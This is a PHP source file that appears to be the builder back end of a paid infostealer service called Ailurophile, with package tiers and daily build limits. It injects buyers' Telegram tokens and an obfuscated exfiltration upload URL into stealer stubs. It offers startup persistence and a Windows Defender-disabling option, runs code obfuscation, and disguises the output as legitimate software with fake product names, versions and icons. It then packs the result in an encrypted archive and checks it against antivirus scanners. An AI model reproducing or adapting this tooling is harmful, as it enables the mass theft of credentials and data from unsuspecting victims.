<?php
session_start();
include __DIR__ . "/config.php";
require "vendor/autoload.php";
if (!isset($_SESSION["user_id"])) {
    echo json_encode(["status" => "error", "message" => "Please login"]);
    exit();
}
$user_id = $_SESSION["user_id"];
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$user) {
    echo json_encode(["status" => "error", "message" => "Invalid request"]);
    exit();
}
$username = $user["username"];
$role = $user["role"];

$max_requests = 0;
if ($role == "2") {
    $max_requests = 2;
} elseif ($role == "3") {
    $max_requests = 5;
} elseif ($role == "4") {
    $max_requests = 20;
}

if ($role == "1") {
    echo json_encode([
        "status" => "error",
        "message" =>
            "Please buy package or contact @Ailurophilevn for 3 days trial.",
    ]);
    exit();
}
$current_date = date("Y-m-d");
$stmt = $pdo->prepare(
    "SELECT request_count FROM request_counts WHERE user_id = ? AND request_date = ?"
);
$stmt->execute([$user_id, $current_date]);
$request_count = $stmt->fetch(PDO::FETCH_ASSOC);
if ($request_count && $request_count["request_count"] >= $max_requests) {
    echo json_encode([
        "status" => "error",
        "message" =>
            "Making stub limit. If you want more please contact @Ailurophilevn",
    ]);
    exit();
}
if (!$request_count) {
    $stmt = $pdo->prepare(
        "INSERT INTO request_counts (user_id, request_date, request_count) VALUES (?, ?, 0)"
    );
    $stmt->execute([$user_id, $current_date]);
    $request_count = ["request_count" => 0];
} else {
    $stmt = $pdo->prepare(
        "UPDATE request_counts SET request_count = request_count + 1 WHERE user_id = ? AND request_date = ?"
    );
    $stmt->execute([$user_id, $current_date]);
}

if ($role != "1") {
    $bot_token = $_POST["bot_token"] ?? null;
    $chat_id = $_POST["chat_id"] ?? null;
    $product_name = $_POST["product_name"] ?? null;
    $product_names = [
        "TechMaster",
        "DataPilot",
        "FileGuard",
        "SecurePro",
        "UltraDrive",
        "ProScan",
        "CloudShield",
        "InfoSafe",
        "SoftLayer",
        "ZipPro",
    ];
    $file_descriptions = [
        "System Protection Software",
        "Data Encryption Utility",
        "Backup and Restore Tool",
        "Advanced File Management",
        "Network Security Suite",
        "Automated Update System",
        "Secure File Storage",
        "Disk Optimization Tool",
        "File Compression Utility",
        "System Diagnostic Tool",
    ];
    $product_versions = [
        "1.0.0.1",
        "2.0.1.0",
        "3.5.2.1",
        "1.1.1.0",
        "4.0.0.2",
        "5.1.0.0",
        "1.2.3.4",
        "2.3.4.5",
        "3.4.5.6",
        "2.0.0.0",
    ];
    $copyrights = [
        "2024 TechMaster Corp. All rights reserved.",
        "2023 DataPilot Inc.",
        "2025 FileGuard Technologies.",
        "2024 SecurePro Software Ltd.",
        "2023 UltraDrive Solutions.",
        "2024 InfoSafe Enterprises.",
        "2024 SoftLayer Systems.",
    ];
    $legal_trademarkss = [
        "TechMaster Trademark",
        "DataPilot Trademark",
        "FileGuard Trademark",
        "SecurePro Trademark",
        "UltraDrive Trademark",
        "InfoSafe Trademark",
        "SoftLayer Trademark",
    ];
    $original_filenames = [
        "TechMaster.exe",
        "DataPilot.exe",
        "FileGuard.exe",
        "SecurePro.exe",
        "UltraDrive.exe",
        "ProScan.exe",
        "CloudShield.exe",
        "InfoSafe.exe",
        "SoftLayer.exe",
        "ZipPro.exe",
    ];
    $product_name = $_POST["product_name"] ?? null;
    if (empty($product_name) || strlen($product_name) > 100) {
        $product_name = $product_names[array_rand($product_names)]; // Random từ danh sách
    }
    $file_description = $_POST["file_description"] ?? null;
    if (empty($file_description) || strlen($file_description) > 255) {
        $file_description = $file_descriptions[array_rand($file_descriptions)]; // Random từ danh sách
    }
    $file_version = $_POST["file_version"] ?? null;
    if (!preg_match('/^\d+\.\d+\.\d+\.\d+$/', $file_version)) {
        $file_version = $product_versions[array_rand($product_versions)]; // Random từ danh sách
    }
    $product_version = $_POST["product_version"] ?? null;
    if (!preg_match('/^\d+\.\d+$/', $product_version)) {
        $product_version = rand(1, 9) . "." . rand(0, 9); // Random version đơn giản
    }
    $copyright = $_POST["copyright"] ?? null;
    if (empty($copyright) || strlen($copyright) > 255) {
        $copyright = $copyrights[array_rand($copyrights)]; // Random từ danh sách
    }
    $legal_trademarks = $_POST["legal_trademarks"] ?? null;
    if (empty($legal_trademarks) || strlen($legal_trademarks) > 255) {
        $legal_trademarks = $legal_trademarkss[array_rand($legal_trademarkss)]; // Random từ danh sách
    }
    $original_filename = $_POST["original_filename"] ?? null;
    if (empty($original_filename) || strlen($original_filename) > 255) {
        $original_filename =
            $original_filenames[array_rand($original_filenames)]; // Random từ danh sách
    }
    if (isset($_POST["startup"])) {
        $startup = "1";
    } else {
        $startup = "0";
    }
	
	    if (isset($_POST["disable_wd"])) {
        $Delivery = "1";
    } else {
        $Delivery = "0";
    }
    $Stub_url = $_POST["url_stub"] ?? null;
	if($role=="2"){
		$Delivery = "0";
		$Stub_url = "";
	}
    if (
        $bot_token === null ||
        $bot_token === "" ||
        $chat_id === null ||
        $chat_id === ""
    ) {
        $bot_token = "";
        $chat_id = "";
    }
    $key_decrypt = bin2hex(random_bytes(10));
    $url1 = base64_encode("https://ailurophilestealer.com/upload.php?");
    $encrypt_data = ailurophile_encrypt($url1, $key_decrypt);
    $data = base64_encode($encrypt_data);
    $filePath = __DIR__ . "/../ailurophilephp/v3lib.php";
    $newConfig = [
        "Telegram_token" => $bot_token,
        "Chat_id" => $chat_id,
        "user_id" => $user_id,
        "upload_url" => $data,
        "key_decrypt" => $key_decrypt,
        "Delivery" => $Delivery,
        "Stub_url" => $Stub_url,
    ];
    if (isset($_FILES["icon"]) && $_FILES["icon"]["error"] === UPLOAD_ERR_OK) {
        $icon_info = pathinfo($_FILES["icon"]["name"]);
        if (strtolower($icon_info["extension"]) === "ico") {
            $icon_destination = __DIR__ . "/../builded/ico.ico";
            if (
                !move_uploaded_file(
                    $_FILES["icon"]["tmp_name"],
                    $icon_destination
                )
            ) {
                echo json_encode([
                    "status" => "error",
                    "message" => "Failed to upload icon.",
                ]);
                exit();
            }
        } else {
            echo json_encode([
                "status" => "error",
                "message" => "Invalid icon file. Only .ico files are allowed.",
            ]);
            exit();
        }
    }
    $verstub = $_POST["verstub"] ?? null;
    if ($verstub == "v2" and $role != "4") {
        echo json_encode([
            "status" => "error",
            "message" => "Please buy package for stub version 2",
        ]);
        exit();
    } 
	elseif ($verstub == "v2" and $role == "4") {
        $srcFolder = 'C:\\xampp\\htdocs\\ailurophilego\\clean';
        $dstFolder = 'C:\\xampp\\htdocs\\ailurophilego\\crypt';
        if (is_dir($dstFolder)) {
            deleteDirectory($dstFolder);
        }
        copyDirectory($srcFolder, $dstFolder);
        $mainGoPath = 'C:\\xampp\\htdocs\\ailurophilego\\crypt\\main.go';
        v2config(
            $mainGoPath,
            "",
            $key_decrypt,
            $bot_token,
            $chat_id,
            $data,
            $Delivery,
            $Stub_url,
            $user_id,
            "",
			$startup
        );
        $nonce = randomNonce(); // Chuỗi nonce 24 ký tự
        $key = randomKey(); // Chuỗi key 64 ký tự
        $rcedit_command =
            'C:\Users\Administrator\go\bin\obfus.exe -calls -deadcode -loops -strings -writechanges -srcpath C:\xampp\htdocs\ailurophilego\crypt ' .
            "-stringNonce " .
            escapeshellarg($nonce) .
            " -stringsKey " .
            escapeshellarg($key);
        $bat_file_content = "@echo off\n" . $rcedit_command . "\n";
        $bat_file_path = 'C:\xampp\htdocs\ailurophilego\ob.bat';
        file_put_contents($bat_file_path, $bat_file_content);
        exec($bat_file_path);
       putenv('GOROOT=C:\\Program Files\\Go');
putenv('GOPATH=C:\\Users\\Administrator\\go');
putenv('PATH=C:\\Program Files\\Go\\bin;C:\\Users\\Administrator\\go\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Program Files\\nodejs\\;C:\\ProgramData\\chocolatey\\bin;C:\\Program Files\\dotnet\\;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\Scripts\\;C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\;C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\Administrator\\AppData\\Roaming\\npm;C:\\xampp\\php;C:\\Users\\Administrator\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319;C:\\Program Files (x86)\\Resource Hacker;C:\\Resource Tuner Console;C:\\Program Files (x86)\\GDG Software\\ExeOutput for PHP 2024;C:\\Users\\Administrator\\AppData\\Local\\GitHubDesktop\\bin;C:\\lua;C:\\msys64;C:\\msys64\\mingw64\\bin;C:\\Users\\Administrator\\AppData\\Roaming\\luarocks\\bin;C:\\upx;C:\\Program Files\\OpenSSL-Win64\\bin');
chdir('C:\\xampp\\htdocs\\ailurophilego\\crypt');
exec('"C:\\Program Files\\Go\\bin\\go.exe" build -ldflags "-H=windowsgui" -o builded.exe main.go > build_log.txt 2>&1', $output, $return_var);
        $source = 'C:\\xampp\\htdocs\\ailurophilego\\crypt\\builded.exe';
        $destination = 'C:\\xampp\\htdocs\\builded\\builded.exe';
        copy($source, $destination);
    } 
	elseif ($verstub == "v3" and $role == "4"){
		$icon_destination = __DIR__ . "/../builded/ico.ico";
		$copy_destination = __DIR__ . "/../ailurophilepy/ico.ico";
		copy($icon_destination, $copy_destination);
		$mainPyPath = 'C:\\xampp\\htdocs\\ailurophilepy\\ailurophilepy.py';
		v3config($bot_token, $chat_id);
		chdir('C:\\xampp\\htdocs\\ailurophilepy');
		$path = getenv('PATH') . ';C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313\\Scripts;C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313';
		putenv("PATH=$path");
		exec('"C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python313\\Scripts\\pyinstaller.exe" --noconsole --onefile --icon "C:\\xampp\\htdocs\\ailurophilepy\\ico.ico" "C:\\xampp\\htdocs\\ailurophilepy\\ailurophilepy.py" > build_log.txt 2>&1', $output, $return_var);
		$source = 'C:\\xampp\\htdocs\\ailurophilepy\\dist\\ailurophilepy.exe';
        $destination = 'C:\\xampp\\htdocs\\builded\\builded.exe';
        copy($source, $destination);
	} 
	else {
        editConfig($filePath, $newConfig);
       $bat_file = "C:\\xampp\\htdocs\\ailurophilephp\\encrypt.bat";
        exec($bat_file . " 2>&1", $output, $return_var);
        $bat_file = "C:\\xampp\\htdocs\\ailurophilephp\\build.bat";
		exec($bat_file . " 2>&1", $output, $return_var);
		chdir("C:\\xampp\\htdocs\\ailurophilephp");
		putenv('PATH=C:\\Program Files\\Go\\bin;C:\\Users\\Administrator\\go\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Program Files\\nodejs\\;C:\\ProgramData\\chocolatey\\bin;C:\\Program Files\\dotnet\\;C:\\ProgramData\\ComposerSetup\\bin;C:\\Program Files\\Git\\cmd;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\Scripts\\;C:\\Users\\Administrator\\AppData\\Local\\Programs\\Python\\Python36-32\\;C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\Administrator\\AppData\\Roaming\\npm;C:\\xampp\\php;C:\\Users\\Administrator\\AppData\\Roaming\\Composer\\vendor\\bin;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319;C:\\Program Files (x86)\\Resource Hacker;C:\\Resource Tuner Console;C:\\Program Files (x86)\\GDG Software\\ExeOutput for PHP 2024;C:\\Users\\Administrator\\AppData\\Local\\GitHubDesktop\\bin;C:\\lua;C:\\msys64;C:\\msys64\\mingw64\\bin;C:\\Users\\Administrator\\AppData\\Roaming\\luarocks\\bin;C:\\upx;C:\\Program Files\\OpenSSL-Win64\\bin');
		$command = '"C:\\Program Files (x86)\\GDG Software\\ExeOutput for PHP 2024\\EXO4PHP.EXE" C:\\xampp\\htdocs\\ailurophilephp\\ailu.exop /c/q/s';
	exec($command, $output, $return_var);
  }
    build_file($file_description,$file_version,$product_name,$product_version,$copyright,$legal_trademarks,$original_filename,$verstub);
} else {
    echo json_encode(["status" => "error", "message" => "Please buy package"]);
}

function editConfig($filePath, $newConfig)
{
    if (!file_exists($filePath)) {
        return;
    }
    $fileLines = file($filePath, FILE_IGNORE_NEW_LINES);
    if (isset($fileLines[1]) && strpos($fileLines[1], '$config') !== false) {
        if (
            preg_match(
                '/\$config\s*=\s*json_decode\(\'(.+?)\'\);/',
                $fileLines[1],
                $matches
            )
        ) {
            $currentConfig = json_decode($matches[1], true);
            foreach ($newConfig as $key => $value) {
                if (isset($currentConfig[$key])) {
                    $currentConfig[$key] = $value;
                }
            }
            $newConfigJson = json_encode($currentConfig);
            $fileLines[1] = str_replace(
                $matches[1],
                $newConfigJson,
                $fileLines[1]
            );
            if (
                file_put_contents($filePath, implode("\n", $fileLines)) !==
                false
            ) {
            } else {
            }
        } else {
        }
    } else {
    }
}
function ailurophile_encrypt($data, $key)
{
    $key_length = strlen($key);
    $data_length = strlen($data);
    $encrypted_data = "";

    for ($i = 0; $i < $data_length; $i++) {
        $encrypted_data .= chr(
            (ord($data[$i]) + ord($key[$i % $key_length])) % 256
        );
    }

    return base64_encode($encrypted_data);
}

function copyDirectory($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if ($file != "." && $file != "..") {
            if (is_dir($src . "/" . $file)) {
                copyDirectory($src . "/" . $file, $dst . "/" . $file);
            } else {
                copy($src . "/" . $file, $dst . "/" . $file);
            }
        }
    }
    closedir($dir);
}

function deleteDirectory($dirPath)
{
    if (!is_dir($dirPath)) {
        return;
    }
    $files = array_diff(scandir($dirPath), [".", ".."]);
    foreach ($files as $file) {
        $fullPath = "$dirPath/$file";
        if (is_dir($fullPath)) {
            deleteDirectory($fullPath);
        } else {
            unlink($fullPath);
        }
    }
    rmdir($dirPath);
}

function v3config($Telegram_token, $Telegram_chat_id) {
    // Đường dẫn cố định tới file Python
    $filePath = 'C:\\xampp\\htdocs\\ailurophilepy\\Ailurophilepy.py';

    // Đọc nội dung file vào một mảng
    $fileContent = file($filePath);

    // Kiểm tra nếu đọc thành công
    if ($fileContent === false) {
        echo "Failed to read the file.";
        return;
    }

    // Cập nhật dòng 34 và 35
    $fileContent[33] = 'Telegram_token = "' . $Telegram_token . "\"\n";
    $fileContent[34] = 'Telegram_chat_id = "' . $Telegram_chat_id . "\"\n";

    // Ghi lại các thay đổi vào file
    $result = file_put_contents($filePath, implode('', $fileContent));
}



function v2config(
    $pathgo,
    $PayloadCrypted_url,
    $key_decrypt,
    $Telegram_token,
    $Chat_id,
    $upload_url,
    $Delivery,
    $Stub_url,
    $user_id,
    $welcome,
	$startup
) {
    $filePath = $pathgo;
    $fileContent = file_get_contents($filePath);
    $startPosition = strpos($fileContent, "configJSON := `");
    if ($startPosition !== false) {
        $startPosition += strlen("configJSON := `");
        $endPosition = strpos($fileContent, "`", $startPosition);
        $jsonString = substr(
            $fileContent,
            $startPosition,
            $endPosition - $startPosition
        );
        $configArray = json_decode($jsonString, true);
        if (json_last_error() === JSON_ERROR_NONE) {
			$configArray["PayloadCrypted_url"] = (string)$PayloadCrypted_url;
            $configArray["key_decrypt"] = (string)$key_decrypt;
            $configArray["Telegram_token"] = (string)$Telegram_token;
            $configArray["Chat_id"] = (string)$Chat_id;
            $configArray["upload_url"] = (string)$upload_url;
            $configArray["Delivery"] = (string)$Delivery;
            $configArray["Stub_url"] = (string)$Stub_url;
            $configArray["user_id"] = (string)$user_id;
            $configArray["welcome"] = (string)$welcome;
            $configArray["Startup"] = (string)$startup;
            $newJsonString = json_encode($configArray, JSON_UNESCAPED_SLASHES);
            $newFileContent = substr_replace(
                $fileContent,
                $newJsonString,
                $startPosition,
                $endPosition - $startPosition
            );
            file_put_contents($filePath, $newFileContent);
        } else {
        }
    } else {
    }
}

function randomNonce($length = 24)
{
    return bin2hex(random_bytes($length / 2));
}

// Hàm tạo random key dài 64 ký tự
function randomKey($length = 64)
{
    return bin2hex(random_bytes($length / 2));
}

function build_file(
    $file_description,
    $file_version,
    $product_name,
    $product_version,
    $copyright,
    $legal_trademarks,
    $original_filename,
	$verstub
) {
    $path = __DIR__ . "/../builded/builded.exe";
    $exe_path = 'C:\xampp\htdocs\builded\builded.exe';

    $icon_path = 'C:\xampp\htdocs\builded\ico.ico';
    $rcedit_command = 
        '"C:\Program Files\Go\bin\rcedit.exe" "' . $exe_path . '" ' .
        '--set-icon "' . $icon_path . '" ' .
        '--set-version-string "FileDescription" "' . $file_description . '" ' .
        '--set-version-string "FileVersion" "' . $file_version . '" ' .
        '--set-version-string "ProductName" "' . $product_name . '" ' .
        '--set-version-string "ProductVersion" "' . $product_version . '" ' .
        '--set-version-string "LegalCopyright" "' . $copyright . '" ' .
        '--set-version-string "LegalTrademarks" "' . $legal_trademarks . '" ' .
        '--set-version-string "OriginalFilename" "' . $original_filename . '"';

    $bat_file_content = "@echo off\n" . $rcedit_command . "\n";
    $bat_file_path = 'C:\xampp\htdocs\builded\run_rcedit.bat';
    
    // Ghi nội dung file batch và thực thi lệnh rcedit
    file_put_contents($bat_file_path, $bat_file_content);
    if($verstub=="v2"){	
	exec($bat_file_path);
	}
	$token_scan_file = scan_file();

    // Đổi tên file mới theo sản phẩm
    $new = __DIR__ . "/../builded/" . $product_name;
    $password = bin2hex(random_bytes(8));

    // Đổi tên file và kiểm tra nếu thành công
    if (rename($path, $new)) {
        $newname = uniqid();
        $zipFile = __DIR__ . "/../builded/" . $newname . ".zip";
        $zipPath = '"C:\Program Files\7-Zip\7z.exe"';
        
        // Nén file .exe thành file zip với mật khẩu
        $command = 
            $zipPath . " a -t7z -mhe=on -p" . escapeshellarg($password) . " " . escapeshellarg($zipFile) . " " . escapeshellarg($new);
        exec($command, $output, $return_var);

        // Trả về thông tin sau khi nén thành công
        if ($return_var === 0) {
			if (file_exists($new)) {
            unlink($new);  // Xóa file .exe gốc
			}
            echo json_encode([
                "status" => "success",
                "password" => $password,
                "message" => "https://ailurophilestealer.com/download?stub=" . $newname . ".zip",
				"token_file" => $token_scan_file
            ]);
        } else {
            echo json_encode([
                "status" => "error",
                "message" => "Failed to create zip file."
            ]);
        }
    } else {
        echo json_encode([
            "status" => "error",
            "message" => "Failed to rename the file."
        ]);
    }
}



function scan_file() {
    $url = "https://kleenscan.com/api/v1/file/scan";
    $path = "C:\\xampp\\htdocs\\builded\\builded.exe";
    
    // Kiểm tra xem file có tồn tại không trước khi gửi request
    if (!file_exists($path)) {
        return "Scan error";
    }

    $file = new \CURLFile($path);
    $params = array(
        "avList" => "all",
        "path" => $file
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: multipart/form-data',
        'X-Auth-Token: af8fe83e982036aeac8ff6bc6f37cd9dca336c3d205e55ac2e864bfb04c7546d'
    ));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

    $result = curl_exec($ch);

    // Kiểm tra lỗi cURL
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        curl_close($ch);
        return "cURL error: $error_msg";
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    $result = json_decode($result, true);

    // Kiểm tra phản hồi và mã HTTP
    if ($httpCode === 200 && isset($result['success']) && $result['success'] === true && isset($result['data']['scan_token'])) {
        return $result['data']['scan_token']; // Trả về scan_token nếu thành công
    } else {
        return "Scan error"; // Nếu không thành công, trả về thông báo lỗi
    }
}
?>
